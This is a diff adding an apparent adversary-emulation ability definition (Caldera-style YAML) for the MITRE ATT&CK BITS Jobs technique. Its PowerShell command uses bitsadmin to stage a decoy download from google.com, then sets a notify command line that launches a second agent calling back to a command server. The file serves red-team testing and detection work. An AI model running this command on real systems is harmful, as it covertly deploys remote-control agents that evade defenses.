@@ -1,0 +1,36 @@
+- tactic: defense-evasion
+  technique_name: BITS Jobs
+  technique_id: T1197
+  name: BITSAdmin Agent deployment
+  description: This ability uses a BITSAdmin job to deploy another agent. It creates
+    a fake download from google.com solely to trigger execution of the new agent on  job
+    completion.
+  executors:
+  - name: psh
+    platform: windows
+    command: "bitsadmin /create update;\nbitsadmin /addfile update https://google.com\
+      \ C:\\Users\\Public\\update.exe;\nbitsadmin /setnotifycmdline update \"#{location}\"\
+      \ \"#{location} -server #{server} -group bitsadmin -v\";\nbitsadmin /resume\
+      \ update;\n "
+    code: null
+    language: null
+    build_target: null
+    payloads: []
+    uploads: []
+    timeout: 60
+    parsers: []
+    cleanup:
+    - bitsadmin /cancel update
+    variations: []
+    additional_info: {}
+  requirements: []
+  privilege: ''
+  repeatable: false
+  buckets:
+  - defense-evasion
+  additional_info: {}
+  access: {}
+  singleton: true
+  plugin: ''
+  delete_payload: false
+  id: e52e7918-ce55-4451-ac19-713a52487ae8
